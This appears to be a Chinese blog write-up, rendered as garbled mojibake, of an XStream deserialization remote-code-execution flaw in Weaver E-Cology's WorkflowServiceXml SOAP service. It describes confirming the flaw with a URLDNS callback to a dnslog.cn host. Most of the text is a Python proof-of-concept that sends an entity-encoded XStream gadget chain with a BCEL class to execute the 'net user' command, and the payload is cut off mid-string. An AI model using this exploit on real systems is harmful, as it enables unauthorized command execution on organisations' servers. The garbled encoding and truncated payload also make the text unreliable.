è¿™ä¸ªxså’‹çœ‹èµ·æ¥è¿™ä¹ˆçœ¼ç†Ÿï¼Ÿçœ‹çœ‹xsæ˜¯ä¸ªå•¥ï¼Œä¸€èˆ¬Javaå¯èƒ½ä¼šå®šä¹‰åœ¨ä»£ç æ–‡ä»¶æœ€ä¸Šæ–¹ã€‚ åŸæ¥xsæ˜¯XStreamçš„å¯¹è±¡ æ—¢ç„¶å†³å®šäº†sinkç‚¹ï¼Œä¸‹ä¸€æ­¥è‚¯å®šæ˜¯POCçš„æ’°å†™äº†ï¼Œå…ˆç¡®å®šSOAPåŸºæœ¬æ¨¡æ¿ã€‚ æ ¹æ®æœ‹å‹ç»™çš„æµé‡å¯ä»¥ç¡®å®šåŸºæœ¬SOAPæ¶ˆæ¯ä½“æ¨¡æ¿å¤§è‡´æ˜¯è¿™æ ·çš„ã€‚ 2 éªŒè¯æˆåŠŸã€‚ æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾gadgetäº†ã€‚ ç”±äºå¹¶æ²¡æœ‰å®Œæ•´æºç ï¼Œåªæœ‰éƒ¨åˆ†githubæºç ï¼Œä¸èƒ½ç¡®å®šgadgetï¼Œå…ˆä½¿ç”¨URLDNSè¯•è¯•ã€‚ http://1xsz12.dnslog.cn http://1xsz12.dnslog.cn ç»„åˆæˆ‘ä»¬çš„æ¨¡æ¿è¯•è¯•ã€‚ è¿™é‡Œæ¶‰åŠåˆ°å®ä½“ç¼–ç é—®é¢˜ï¼Œä½œä¸ºæ‡’äººç›´æ¥é€‰æ‹©æ•´ä½“ç¼–ç ç®—äº†ã€‚ éšådnslogæˆåŠŸæ”¶åˆ°è¯·æ±‚ã€‚ æ¼æ´POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: æ³›å¾®E-Cology WorkflowServiceXml RCE \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/services%20/WorkflowServiceXml\" cmd = \"net user\" headers = { 'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)', 'SOAPAction': '\"\"', 'Cmd': cmd, \"Content-Type\": \"text/xml;charset=UTF-8\" } data = ''' &#x3c;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x20;&#x73;&#x65;&#x72;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x27;&#x63;&#x75;&#x73;&#x74;&#x6f;&#x6d;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x3c;&#x75;&#x6e;&#x73;&#x65;&#x72;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x62;&#x6c;&#x65;&#x2d;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#x73;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x3c;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x50;&#x72;&#x69;&#x6f;&#x72;&#x69;&#x74;&#x79;&#x51;&#x75;&#x65;&#x75;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x69;&#x7a;&#x65;&#x3e;&#x32;&#x3c;&#x2f;&#x73;&#x69;&#x7a;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6d;&#x70;&#x61;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x66;&#x78;&#x2e;&#x63;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x2e;&#x4f;&#x62;&#x73;&#x65;&#x72;&#x76;&#x61;&#x62;&#x6c;&#x65;&#x4c;&#x69;&#x73;&#x74;&#x24;&#x31;&#x27;&#x2f;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x2f;&#x64;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x6e;&#x74;&#x3e;&#x33;&#x3c;&#x2f;&#x69;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x62;&#x69;&#x6e;&#x64;&#x2e;&#x76;&#x32;&#x2e;&#x72;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x75;&#x6e;&#x6d;&#x61;&#x72;&#x73;&#x68;&#x61;&#x6c;&#x6c;&#x65;&#x72;&#x2e;&#x42;&#x61;&#x73;&#x65;&#x36;&#x34;&#x44;&#x61;&#x74;&#x61;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x61;&#x74;&#x61;&#x48;&#x61;&#x6e;&#x64;&#x6c;&#x65;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x64;&#x61;&#x74;&#x61;&#x53;&#x6f;&#x75;&#x72;&#x63;&#x65;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x77;&#x73;&#x2e;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x2e;&#x78;&#x6d;&#x6c;&#x2e;&#x58;&#x4d;&#x4c;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x24;&#x58;&#x6d;&#x6c;&#x44;&#x61;&#x74;&#x61;&#x53;&#x6f;&#x75;&#x72;&#x63;&#x65;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3e;&#x74;&#x65;&#x78;&#x74;&#x2f;&#x70;&#x6c;&#x61;&#x69;&#x6e;&#x3c;&#x2f;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x53;&#x65;&#x71;&#x75;&#x65;&#x6e;&#x63;&#x65;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x65;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x78;&#x2e;&#x73;&#x77;&#x69;&#x6e;&#x67;&#x2e;&#x4d;&#x75;&#x6c;&#x74;&#x69;&#x55;&#x49;&#x44;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x73;&#x24;&#x4d;&#x75;&#x6c;&#x74;&#x69;&#x55;&#x49;&#x44;&#x65;&#x66;&#x61;&#x75;&#x6c;&#x74;&#x73;&#x45;&#x6e;&#x75;&#x6d;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x69;&#x74;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x63;&#x6f;&#x6d;&#x2e;&#x73;&#x75;&#x6e;&#x2e;&#x74;&#x6f;&#x6f;&#x6c;&#x73;&#x2e;&#x6a;&#x61;&#x76;&#x61;&#x63;&#x2e;&#x70;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x69;&#x6e;&#x67;&#x2e;&#x4a;&#x61;&#x76;&#x61;&#x63;&#x50;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x69;&#x6e;&#x67;&#x45;&#x6e;&#x76;&#x69;&#x72;&#x6f;&#x6e;&#x6d;&#x65;&#x6e;&#x74;&#x24;&#x4e;&#x61;&#x6d;&#x65;&#x50;&#x72;&#x6f;&#x63;&#x65;&#x73;&#x73;&#x49;&#x74;&#x65;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6e;&#x61;&#x6d;&#x65;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x41;&#x62;&#x73;&#x74;&#x72;&#x61;&#x63;&#x74;&#x4c;&#x69;&#x73;&#x74;&#x24;&#x49;&#x74;&#x72;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x63;&#x75;&#x72;&#x73;&#x6f;&#x72;&#x3e;&#x30;&#x3c;&#x2f;&#x63;&#x75;&#x72;&#x73;&#x6f;&#x72;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6c;&#x61;&#x73;&#x74;&#x52;&#x65;&#x74;&#x3e;&#x2d;&#x31;&#x3c;&#x2f;&#x6c;&#x61;&#x73;&#x74;&#x52;&#x65;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x65;&#x78;&#x70;&#x65;&#x63;&#x74;&#x65;&#x64;&#x4d;&#x6f;&#x64;&#x43;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x30;&#x3c;&#x2f;&#x65;&#x78;&#x70;&#x65;&#x63;&#x74;&#x65;&#x64;&#x4d;&#x6f;&#x64;&#x43;&#x6f;&#x75;&#x6e;&#x74;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x6f;&#x75;&#x74;&#x65;&#x72;&#x2d;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x75;&#x74;&#x69;&#x6c;&#x2e;&#x41;&#x72;&#x72;&#x61;&#x79;&#x73;&#x24;&#x41;&#x72;&#x72;&#x61;&#x79;&#x4c;&#x69;&#x73;&#x74;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x73;&#x3d;&#x27;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x2d;&#x61;&#x72;&#x72;&#x61;&#x79;&#x27;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x3e;&#x24;&#x24;&#x42;&#x43;&#x45;&#x4c;&#x24;&#x24;&#x24;&#x6c;&#x24;&#x38;&#x62;&#x24;&#x49;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x41;&#x24;&#x38;&#x35;&#x56;&#x24;&#x35;&#x62;&#x57;&#x24;&#x54;&#x57;&#x24;&#x55;&#x24;&#x66;&#x65;&#x24;&#x38;&#x36;&#x24;&#x71;&#x24;&#x63;&#x63;&#x30;&#x24;&#x4d;&#x24;&#x38;&#x32;&#x41;&#x24;&#x38;&#x34;&#x24;&#x61;&#x38;&#x24;&#x62;&#x64;&#x24;&#x64;&#x38;&#x56;&#x24;&#x4e;&#x24;&#x75;&#x24;&#x38;&#x39;&#x24;&#x64;&#x36;&#x24;&#x64;&#x65;&#x24;&#x4d;&#x24;&#x64;&#x36;&#x24;&#x38;&#x61;&#x24;&#x35;&#x63;&#x24;&#x65;&#x61;&#x24;&#x72;&#x24;&#x61;&#x30;&#x35;&#x24;&#x55;&#x24;&#x78;&#x24;&#x64;&#x61;&#x24;&#x65;&#x61;&#x30;&#x24;&#x69;&#x61;&#x24;&#x71;&#x24;&#x39;&#x39;&#x24;&#x38;&#x39;&#x24;&#x39;&#x33;&#x24;&#x4a;&#x50;&#x24;&#x37;&#x62;&#x24;&#x62;&#x31;&#x24;&#x61;&#x64;&#x24;&#x62;&#x64;&#x24;&#x64;&#x66;&#x24;&#x65;&#x66;&#x24;&#x61;&#x64;&#x24;&#x62;&#x64;&#x24;&#x62;&#x63;&#x24;&#x66;&#x38;&#x24;&#x65;&#x32;&#x53;&#x24;&#x6c;&#x24;&#x35;&#x63;&#x24;&#x61;&#x62;&#x24;&#x78;&#x6a;&#x24;&#x35;&#x62;&#x24;&#x62;&#x62;&#x24;&#x64;&#x61;&#x24;&#x33;&#x65;&#x24;&#x66;&#x36;&#x47;&#x69;&#x24;&#x62;&#x66;&#x33;&#x24;&#x4a;&#x24;&#x39;&#x34;&#x24;&#x39;&#x30;&#x24;&#x61;&#x38;&#x24;&#x61;&#x63;&#x24;&#x63;&#x35;&#x24;&#x39;&#x39;&#x39;&#x24;&#x66;&#x62;&#x24;&#x37;&#x63;&#x24;&#x66;&#x62;&#x24;&#x66;&#x36;&#x24;&#x65;&#x64;&#x24;&#x62;&#x64;&#x4f;&#x24;&#x65;&#x36;&#x24;&#x64;&#x66;&#x24;&#x35;&#x62;&#x24;&#x62;&#x66;&#x24;&#x66;&#x64;&#x24;&#x4a;&#x24;&#x65;&#x30;&#x31;&#x24;&#x66;&#x63;&#x24;&#x61;&#x63;&#x24;&#x61;&#x33;&#x24;&#x4a;&#x24;&#x38;&#x37;&#x74;&#x24;&#x61;&#x34;&#x31;&#x24;&#x6f;&#x24;&#x39;&#x37;&#x51;&#x24;&#x4e;&#x24;&#x38;&#x37;&#x75;&#x24;&#x69;&#x24;&#x63;&#x31;&#x73;&#x24;&#x67;&#x24;&#x38;&#x65;&#x24;&#x61;&#x61;&#x24;&#x63;&#x38;&#x24;&#x65;&#x38;&#x50;&#x31;&#x24;&#x61;&#x36;&#x24;&#x65;&#x32;&#x79;&#x24;&#x6a;&#x24;&#x65;&#x33;&#x38;&#x24;&#x73;&#x24;&#x39;&#x31;&#x24;&#x5f;&#x48;&#x24;&#x63;&#x39;&#x71;&#x24;&#x4e;&#x24;&#x54;&#x24;&#x66;&#x32;&#x79;&#x42;&#x24;&#x63;&#x37;&#x49;&#x24;&#x62;&#x63;&#x24;&#x75;&#x24;&#x39;&#x37;&#x24;&#x39;&#x37;&#x34;&#x24;&#x39;&#x63;&#x52;&#x71;&#x5a;&#x24;&#x38;&#x33;&#x24;&#x61;&#x39;&#x24;&#x70;&#x24;&#x38;&#x61;&#x49;&#x24;&#x4e;&#x24;&#x39;&#x36;&#x24;&#x38;&#x61;&#x24;&#x76;&#x24;&#x4e;&#x24;&#x76;&#x24;&#x56;&#x42;&#x24;&#x63;&#x37;&#x24;&#x5a;&#x4c;&#x24;&#x63;&#x62;&#x65;&#x46;&#x24;&#x38;&#x37;&#x24;&#x38;&#x64;&#x24;&#x62;&#x33;&#x24;&#x33;&#x61;&#x24;&#x62;&#x61;&#x30;&#x24;&#x61;&#x62;&#x24;&#x6e;&#x24;&#x78;&#x24;&#x39;&#x66;&#x39;&#x24;&#x62;&#x39;&#x38;&#x72;&#x71;&#x35;&#x24;&#x65;&#x34;&#x55;&#x24;&#x39;&#x63;&#x24;&#x64;&#x33;&#x24;&#x66;&#x31;&#x24;&#x51;&#x24;&#x33;&#x63;&#x24;&#x56;&#x24;&#x46;&#x24;&#x46;&#x24;&#x38;&#x64;&#x24;&#x62;&#x62;&#x6d;&#x24;&#x63;&#x37;&#x24;&#x66;&#x36;&#x24;&#x66;&#x37;&#x24;&#x75;&#x24;&#x49;&#x24;&#x63;&#x35;&#x24;&#x62;&#x62;&#x24;&#x63;&#x37;&#x24;&#x56;&#x24;&#x38;&#x34;&#x24;&#x48;&#x24;&#x64;&#x63;&#x24;&#x76;&#x24;&#x61;&#x31;&#x24;&#x61;&#x30;&#x35;&#x6d;&#x24;&#x33;&#x62;&#x62;&#x24;&#x62;&#x34;&#x24;&#x39;&#x38;&#x24;&#x39;&#x62;&#x24;&#x55;&#x24;&#x64;&#x65;&#x24;&#x39;&#x38;&#x39;&#x24;&#x39;&#x39;&#x24;&#x61;&#x35;&#x24;&#x71;&#x24;&#x39;&#x61;&#x76;&#x24;&#x7a;&#x33;&#x24;&#x33;&#x62;&#x6e;&#x7a;&#x24;&#x62;&#x36;&#x24;&#x64;&#x63;&#x57;&#x24;&#x38;&#x34;&#x61;&#x24;&#x37;&#x66;&#x24;&#x63;&#x36;&#x24;&#x61;&#x36;&#x24;&#x38;&#x64;&#x24;&#x65;&#x36;&#x24;&#x66;&#x34;&#x24;&#x62;&#x65;&#x24;&#x38;&#x31;&#x24;&#x61;&#x31;&#x74;&#x72;&#x68;&#x24;&#x63;&#x65;&#x24;&#x63;&#x65;&#x24;&#x66;&#x36;&#x24;&#x76;&#x24;&#x64;&#x30;&#x76;&#x24;&#x35;&#x62;&#x24;&#x64;&#x39;&#x24;&#x38;&#x61;&#x24;&#x63;&#x64;&#x24;&#x61;&#x38;&#x6f;&#x24;&#x65;&#x35;&#x24;&#x4c;&#x24;&#x61;&#x65;&#x35;&#x24;&#x78;&#x24;&#x37;&#x63;&#x24;&#x64;&#x61;&#x24;&#x39;&#x62;&#x24;&#x6a;&#x24;&#x63;&#x38;&#x24;&#x39;&#x61;&#x24;&#x65;&#x37;&#x24;&#x63;&#x66;&#x24;&#x78;&#x58;&#x24;&#x39;&#x64;&#x24;&#x33;&#x65;&#x6b;&#x24;&#x63;&#x65;&#x24;&#x39;&#x39;&#x24;&#x63;&#x39;&#x24;&#x61;&#x63;&#x24;&#x65;&#x39;&#x4c;&#x24;&#x74;&#x24;&#x76;&#x24;&#x77;&#x24;&#x55;&#x24;&#x61;&#x38;&#x24;&#x54;&#x24;&#x39;&#x64;&#x24;&#x57;&#x24;&#x66;&#x65;&#x24;&#x34;&#x30;&#x24;&#x64;&#x31;&#x24;&#x66;&#x33;&#x24;&#x38;&#x34;&#x24;&#x65;&#x33;&#x24;&#x6c;&#x24;&#x56;&#x24;&#x65;&#x37;&#x24;&#x38;&#x61;&#x24;&#x61;&#x32;&#x24;&#x65;&#x30;&#x24;&#x38;&#x66;&#x24;&#x75;&#x58;&#x24;&#x62;&#x37;&#x24;&#x4d;&#x24;&#x65;&#x38;&#x24;&#x38;&#x39;&#x33;&#x59;&#x61;&#x24;&#x66;&#x39;&#x24;&#x63;&#x39;&#x24;&#x52;&#x24;&#x65;&#x31;&#x24;&#x63;&#x66;&#x24;&#x62;&#x38;&#x53;&#x24;&#x64;&#x34;&#x58;&#x65;&#x55;&#x24;&#x63;&#x31;&#x65;&#x24;&#x38;&#x30;&#x24;&#x66;&#x66;&#x24;&#x61;&#x33;&#x24;&#x50;&#x4f;&#x24;&#x39;&#x65;&#x24;&#x72;&#x24;&#x39;&#x38;&#x24;&#x75;&#x24;&#x65;&#x35;&#x24;&#x38;&#x63;&#x24;&#x38;&#x32;&#x58;&#x24;&#x6a;&#x33;&#x24;&#x63;&#x33;&#x24;&#x62;&#x36;&#x24;&#x63;&#x38;&#x4a;&#x24;&#x78;&#x24;&#x39;&#x61;&#x24;&#x74;&#x24;&#x4b;&#x79;&#x24;&#x64;&#x37;&#x24;&#x76;&#x30;&#x24;&#x58;&#x24;&#x39;&#x64;&#x24;&#x6e;&#x24;&#x69;&#x24;&#x66;&#x33;&#x6c;&#x5f;&#x78;&#x74;&#x24;&#x61;&#x64;&#x24;&#x63;&#x63;&#x24;&#x78;&#x68;&#x24;&#x78;&#x24;&#x65;&#x62;&#x24;&#x64;&#x39;&#x6e;&#x24;&#x62;&#x32;&#x24;&#x79;&#x24;&#x65;&#x65;&#x24;&#x78;&#x63;&#x24;&#x66;&#x36;&#x24;&#x4c;&#x73;&#x24;&#x77;&#x24;&#x63;&#x30;&#x24;&#x38;&#x34;&#x24;&#x61;&#x63;&#x24;&#x64;&#x63;&#x54;&#x24;&#x62;&#x35;&#x24;&#x64;&#x62;&#x24;&#x38;&#x63;&#x24;&#x65;&#x66;&#x24;&#x64;&#x39;&#x24;&#x63;&#x65;&#x24;&#x62;&#x34;&#x74;&#x4b;&#x52;&#x24;&#x64;&#x61;&#x24;&#x63;&#x62;&#x24;&#x48;&#x45;&#x24;&#x64;&#x66;&#x24;&#x63;&#x65;&#x24;&#x73;&#x33;&#x24;&#x39;&#x36;&#x24;&#x65;&#x39;&#x38;&#x24;&#x38;&#x31;&#x24;&#x38;&#x35;&#x24;&#x63;&#x38;&#x24;&#x39;&#x63;&#x24;&#x65;&#x39;&#x24;&#x65;&#x64;&#x24;&#x64;&#x38;&#x24;&#x61;&#x31;&#x24;&#x61;&#x30;&#x63;&#x24;&#x39;&#x39;&#x24;&#x64;&#x61;&#x24;&#x64;&#x30;&#x24;&#x38;&#x32;&#x24;&#x72;&#x24;&#x66;&#x32;&#x24;&#x62;&#x65;&#x24;&#x65;&#x64;&#x24;&#x33;&#x61;&#x24;&#x33;&#x63;&#x6f;&#x24;&#x63;&#x39;&#x24;&#x66;&#x38;&#x24;&#x61;&#x36;&#x35;&#x24;&#x33;&#x62;&#x62;&#x24;&#x65;&#x36;&#x24;&#x44;&#x24;&#x38;&#x36;&#x24;&#x64;&#x39;&#x24;&#x59;&#x24;&#x77;&#x24;&#x37;&#x63;&#x24;&#x62;&#x36;&#x24;&#x38;&#x35;&#x24;&#x38;&#x61;&#x24;&#x6f;&#x24;&#x61;&#x62;&#x24;&#x63;&#x65;&#x52;&#x24;&#x62;&#x33;&#x24;&#x63;&#x65;&#x24;&#x79;&#x24;&#x6c;&#x24;&#x70;&#x24;&#x63;&#x39;&#x24;&#x62;&#x38;&#x45;&#x24;&#x63;&#x66;&#x24;&#x53;&#x24;&#x63;&#x33;&#x24;&#x62;&#x36;&#x24;&#x79;&#x43;&#x24;&#x39;&#x33;&#x64;&#x24;&#x33;&#x65;&#x24;&#x6e;&#x24;&#x4e;&#x24;&#x67;&#x24;&#x64;&#x38;&#x24;&#x38;&#x34;&#x24;&#x63;&#x64;&#x24;&#x77;&#x24;&#x65;&#x36;&#x24;&#x4d;&#x24;&#x63;&#x63;&#x63;&#x24;&#x63;&#x31;&#x24;&#x63;&#x30;&#x24;&#x63;&#x62;&#x24;&#x6d;&#x24;&#x64;&#x66;&#x24;&#x35;&#x62;&#x24;&#x79;&#x37;&#x24;&#x39;&#x37;&#x24;&#x62;&#x30;&#x24;&#x63;&#x63;&#x24;&#x61;&#x32;&#x35;&#x24;&#x65;&#x33;&#x24;&#x73;&#x24;&#x69;&#x24;&#x65;&#x31;&#x24;&#x63;&#x66;&#x24;&#x62;&#x62;&#x24;&#x64;&#x65;&#x6c;&#x24;&#x6f;&#x6b;&#x24;&#x58;&#x24;&#x37;&#x63;&#x24;&#x65;&#x31;&#x24;&#x71;&#x24;&#x63;&#x36;&#x24;&#x61;&#x63;&#x24;&#x37;&#x63;&#x66;&#x24;&#x61;&#x39;&#x24;&#x33;&#x63;&#x24;&#x77;&#x24;&#x35;&#x65;&#x31;&#x24;&#x66;&#x30;&#x24;&#x77;&#x24;&#x35;&#x65;&#x63;&#x24;&#x38;&#x35;&#x6a;&#x24;&#x61;&#x61;&#x24;&#x63;&#x31;&#x24;&#x38;&#x65;&#x58;&#x51;&#x34;&#x24;&#x44;&#x24;&#x61;&#x66;&#x24;&#x65;&#x33;&#x24;&#x43;&#x49;&#x5a;&#x49;&#x24;&#x33;&#x61;&#x24;&#x65;&#x33;&#x35;&#x24;&#x66;&#x30;&#x24;&#x47;&#x24;&#x64;&#x65;&#x34;&#x24;&#x66;&#x30;&#x24;&#x57;&#x24;&#x24;&#x24;&#x67;&#x78;&#x24;&#x68;&#x24;&#x58;&#x24;&#x61;&#x39;&#x24;&#x37;&#x62;&#x6a;&#x24;&#x39;&#x31;&#x24;&#x65;&#x36;&#x61;&#x24;&#x64;&#x33;&#x24;&#x6f;&#x24;&#x37;&#x62;&#x24;&#x47;&#x24;&#x64;&#x65;&#x24;&#x63;&#x31;&#x24;&#x62;&#x62;&#x4c;&#x24;&#x63;&#x39;&#x24;&#x63;&#x30;&#x24;&#x37;&#x62;&#x78;&#x24;&#x64;&#x66;&#x24;&#x63;&#x30;&#x24;&#x48;&#x24;&#x66;&#x38;&#x24;&#x39;&#x30;&#x39;&#x24;&#x79;&#x24;&#x64;&#x31;&#x24;&#x63;&#x66;&#x24;&#x64;&#x61;&#x56;&#x24;&#x54;&#x24;&#x63;&#x66;&#x32;&#x24;&#x38;&#x64;&#x24;&#x58;&#x24;&#x62;&#x33;&#x63;&#x24;&#x4d;&#x43;&#x37;&#x24;&#x66;&#x30;&#x24;&#x52;&#x24;&#x33;&#x65;&#x24;&#x24;&#x24;&#x38;&#x33;&#x24;&#x63;&#x62;&#x75;&#x24;&#x61;&#x38;&#x24;&#x38;&#x61;&#x24;&#x61;&#x30;&#x24;&#x63;&#x63;&#x24;&#x33;&#x66;&#x24;&#x65;&#x33;&#x24;&#x61;&#x66;&#x61;&#x24;&#x35;&#x65;&#x24;&#x63;&#x35;&#x24;&#x74;&#x24;&#x47;&#x24;&#x33;&#x65;&#x24;&#x63;&#x35;&#x67;&#x24;&#x47;&#x24;&#x33;&#x65;&#x24;&#x63;&#x37;&#x24;&#x58;&#x24;&#x77;&#x24;&#x62;&#x65;&#x34;&#x24;&#x66;&#x30;&#x24;&#x56;&#x24;&#x62;&#x65;&#x24;&#x39;&#x36;&#x64;&#x24;&#x37;&#x64;&#x24;&#x61;&#x33;&#x24;&#x61;&#x30;&#x24;&#x65;&#x31;&#x64;&#x24;&#x62;&#x66;&#x24;&#x38;&#x31;&#x6f;&#x24;&#x66;&#x31;&#x24;&#x39;&#x64;&#x24;&#x38;&#x31;&#x24;&#x65;&#x66;&#x71;&#x24;&#x63;&#x39;&#x24;&#x63;&#x30;&#x24;&#x50;&#x24;&#x66;&#x38;&#x51;&#x24;&#x42;&#x58;&#x24;&#x62;&#x66;&#x24;&#x33;&#x61;&#x24;&#x46;&#x32;&#x24;&#x66;&#x30;&#x24;&#x54;&#x36;&#x24;&#x64;&#x33;&#x24;&#x66;&#x64;&#x52;&#x24;&#x62;&#x62;&#x24;&#x78;&#x24;&#x65;&#x38;&#x24;&#x62;&#x61;&#x53;&#x24;&#x38;&#x66;&#x24;&#x77;&#x24;&#x65;&#x38;&#x24;&#x62;&#x63;&#x43;&#x24;&#x64;&#x66;&#x55;&#x24;&#x63;&#x35;&#x24;&#x33;&#x63;&#x36;&#x24;&#x65;&#x33;&#x31;&#x24;&#x52;&#x24;&#x57;&#x24;&#x62;&#x65;&#x24;&#x64;&#x32;&#x24;&#x63;&#x66;&#x24;&#x38;&#x62;&#x24;&#x66;&#x62;&#x35;&#x24;&#x66;&#x31;&#x24;&#x65;&#x65;&#x24;&#x66;&#x34;&#x4a;&#x24;&#x55;&#x24;&#x66;&#x62;&#x24;&#x61;&#x33;&#x43;&#x